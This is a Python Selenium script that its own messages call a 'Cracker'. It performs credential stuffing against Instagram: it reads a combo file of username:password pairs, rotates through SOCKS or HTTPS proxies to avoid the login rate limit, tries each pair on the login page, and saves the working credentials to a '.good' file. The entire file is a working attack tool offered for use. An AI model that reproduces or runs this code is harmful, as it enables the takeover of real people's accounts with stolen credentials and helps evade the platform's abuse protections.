from selenium import webdriver
from selenium.common import exceptions as serror
import random
import datetime
import time

start_time = time.time()
dead_proxy = set()

def good_log(combo: str, username: str, password: str) -> None:
    with open(combo+'.good', 'a') as file:
        file.write(f'{username}:{password}\n')

def get_driver(proxy_ip, proxy_port, proxy_type, socks_version=5):
    profile = webdriver.FirefoxProfile()
    profile.set_preference("network.proxy.type", 1)
    profile.set_preference(f"network.proxy.{proxy_type}", proxy_ip)
    profile.set_preference(f"network.proxy.{proxy_type}_port", proxy_port)
    profile.set_preference("network.proxy.socks_version", socks_version)
    profile.set_preference("network.proxy.socks_remote_dns", True)
    profile.update_preferences()
    driver = webdriver.Firefox(profile)
    return driver

def get_proxy(proxy_list: list[str], default_type, default_socks_version):
    end = False
    if len(dead_proxy) == len(proxy_list):
        if not end:
            print(f'All Proxy is dead Cracker Stoped\nRemaining users were saved on {combo}.more')
        end = True
        raise ConnectionError('All Proxy Dead')
    while True:
        proxy = random.choice(proxy_list).strip()
        if proxy:
            if proxy.startswith('socks4://'):
                socks_version = 4
                proxy_type = 'socks'
                proxy = proxy.lstrip('socks4://')
            elif proxy.startswith('socks5://'):
                socks_version = 5
                proxy_type = 'socks'
                proxy = proxy.lstrip('socks5://')
            elif proxy.startswith('https://'):
                proxy_type = 'https'
                proxy = proxy.lstrip('https://')
            else:
                proxy_type = default_type
                socks_version = default_socks_version
            
            try:
                ip, port = proxy.split(':')
                return (ip,int(port), proxy_type, socks_version)
            except ValueError:
                continue


def login(driver, username, password):
    driver.get("https://www.instagram.com/accounts/login/")
    time.sleep(1)
    try:
        driver.find_element_by_xpath('//*[text()="Please wait a few minutes before you try again."]')
        driver.close()
        return 'proxy_error'
    except serror.NoSuchElementException:
        pass

    try:
        driver.find_element_by_xpath('//*[text()="Accept All"]').click()
    except Exception:
        pass
    time.sleep(2)
    while True:
        try:
            driver.find_element_by_xpath("//input[@name='username']").send_keys(username)
            driver.find_element_by_xpath("//input[@name='password']").send_keys(password)
            driver.find_element_by_xpath("//button[@type='submit']").click()
            time.sleep(5)
            if driver.current_url == "https://www.instagram.com/accounts/login/":
                driver.close()
                return 'login_error'
            else:
                driver.close()
                return 'login_success'
        except serror.NoSuchElementException:
            continue
        except serror.ElementClickInterceptedException:
            driver.close()
            return 'login_error'


if __name__ == '__main__':
    socks_version = 5
    combo = input('Combo File: ')
    proxy = input('Proxy File: ')
    proxy_type = input('Default Proxy Type [socks/https]: ')
    with  open(proxy, 'r') as file:
        proxy = file.readlines()
    if proxy_type == 'socks':
        socks_version = int(input('Socks Version [4/5]: '))
    with open(combo, 'r') as file:
        for line in file:
            try:
                username,password = line.strip().split(':')
                while True:
                    driver = get_driver(*get_proxy(proxy, proxy_type, socks_version))
                    try:
                        res = login(driver, username, password)
                        if  res == 'proxy_error':
                            raise serror.WebDriverException("proxyConnectFailure")
                        elif res == 'login_error':
                            print(f'Login Error {username}:{password}')
                            break
                        elif res == 'login_success':
                            print(f'Successfully Login at {username}:{password}')
                            good_log(combo, username, password)
                            break
                        else:
                            break
                    except serror.WebDriverException as err:
                        if 'proxyConnectFailure' in err.msg:
                            if driver.profile.default_preferences.get('network.proxy.socks'):
                                p = driver.profile.default_preferences.get
                                dead_proxy.add(
                                    (p('network.proxy.socks'), p('network.proxy.socks_port'),
                                    p('network.proxy.socks_version'))
                                    )
                                print('Bad Proxy Found socks{} {} : {}'.format(
                                    p('network.proxy.socks_version'),
                                    p('network.proxy.socks'), p('network.proxy.socks_port')
                                ))
                                driver.close()
                                continue
                            elif driver.profile.default_preferences.get('network.proxy.https'):
                                p = driver.profile.default_preferences.get
                                dead_proxy.add(
                                    (p('network.proxy.https'), p('network.proxy.https_port'),
                                    p('network.proxy.socks_version'))
                                    )
                                print('Bad Proxy Found https {} : {}'.format(
                                    p('network.proxy.https'), p('network.proxy.https_port')))
                                driver.close()
                                continue
            except ValueError:
                continue
            except ConnectionError as err:
                with open(combo+'.more', 'a') as file:
                    file.write(f'{username}:{password}\n')

print('Work Finished')
print('Run time: {}'.format(str(datetime.timedelta(seconds=int(time.time()-start_time)))))
